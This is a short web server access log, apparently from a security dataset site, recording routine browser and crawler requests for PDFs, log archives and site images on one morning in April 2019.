113.171.224.176 - - [22/Apr/2019:06:59:01 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
100.1.164.121 - - [22/Apr/2019:07:01:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36" 
216.244.66.245 - - [22/Apr/2019:07:06:27 -0700] "GET /self.logs/error.log.2019-04-09.gz HTTP/1.1" 200 5463 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
213.165.163.222 - - [22/Apr/2019:07:06:56 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
213.165.163.222 - - [22/Apr/2019:07:06:56 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
66.102.9.141 - - [22/Apr/2019:07:12:27 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.9.141 - - [22/Apr/2019:07:12:27 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
104.140.103.5 - - [22/Apr/2019:07:12:28 -0700] "GET / HTTP/1.0" 200 46424 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
3.91.157.213 - - [22/Apr/2019:07:15:00 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
3.91.157.213 - - [22/Apr/2019:07:15:00 -0700] "GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1" 200 2560295 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
3.91.157.213 - - [22/Apr/2019:07:15:14 -0700] "GET /self.logs/ HTTP/1.1" 200 16034 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
3.91.157.213 - - [22/Apr/2019:07:15:18 -0700] "GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1" 301 552 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
3.91.157.213 - - [22/Apr/2019:07:15:18 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1" 200 722 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
3.91.157.213 - - [22/Apr/2019:07:15:21 -0700] "GET / HTTP/1.1" 304 189 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
3.91.157.213 - - [22/Apr/2019:07:15:24 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 1306918 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
85.72.43.169 - - [22/Apr/2019:07:17:05 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299" 
85.72.43.169 - - [22/Apr/2019:07:17:05 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299" 
85.72.43.169 - - [22/Apr/2019:07:17:05 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299" 
